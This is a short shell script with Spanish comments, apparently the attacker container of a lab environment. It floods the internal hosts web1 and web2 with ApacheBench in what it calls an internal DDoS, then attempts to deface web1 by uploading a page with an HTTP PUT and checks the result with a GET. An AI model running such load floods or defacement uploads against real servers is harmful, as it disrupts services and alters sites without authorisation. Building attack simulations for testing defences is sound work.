#!/bin/sh

# 1) Espera que web1 y web2 estén arriba
echo "Esperando 15s a que los servicios arranquen…"
sleep 15

# 2) DDoS interno con ab
echo "Iniciando DDoS interno contra web1 y web2…"
ab -n 5000 -c 100 http://web1/ > /opt/ab_web1.log 2>&1
ab -n 5000 -c 100 http://web2/ > /opt/ab_web2.log 2>&1

# 3) Dale unos segundos para que Flask reciba bien todo
echo "Pausando otros 5s antes del defacement…"
sleep 5

# 4) Intento de defacement con PUT y salida verbosa
echo "Haciendo PUT de defacement a web1…"
curl -v \
     -H "Content-Type: text/plain" \
     -X PUT \
     --data-binary @/opt/defaced.html \
     http://web1/ \
 2>&1 | tee /opt/put_response.log

# 5) Comprobación inmediata con GET
echo "Verificando con GET a web1…"
curl -v http://web1/ 2>&1 | tee /opt/get_after_put.log

# 6) Mantenemos vivo el contenedor para inspección
echo "Script terminado. Contenedor attacker seguirá vivo para inspección."
tail -f /dev/null
